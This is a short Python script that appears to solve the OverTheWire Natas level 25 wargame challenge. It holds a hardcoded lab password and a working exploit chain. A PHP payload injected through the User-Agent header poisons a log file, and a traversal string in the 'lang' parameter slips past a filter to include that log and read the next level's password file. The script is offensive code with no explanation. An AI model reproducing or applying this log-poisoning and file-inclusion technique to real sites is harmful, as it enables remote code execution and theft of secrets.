import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas25.natas.labs.overthewire.org/'
response = ''
# base auth
auth = HTTPBasicAuth('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')

# setup a new session
session = requests.Session()
response = session.post(url, auth=auth)
sessionId = session.cookies.get_dict()['PHPSESSID']
cookies = {'User-Agent' : '<?php echo file_get_contents(\'/etc/natas_webpass/natas26\'); ?>'}
data = { 'lang' : '....//logs/natas25_' + sessionId + '.log' }
response = session.post(url, data=data, headers=cookies, auth=auth)
text = response.text
print(text)

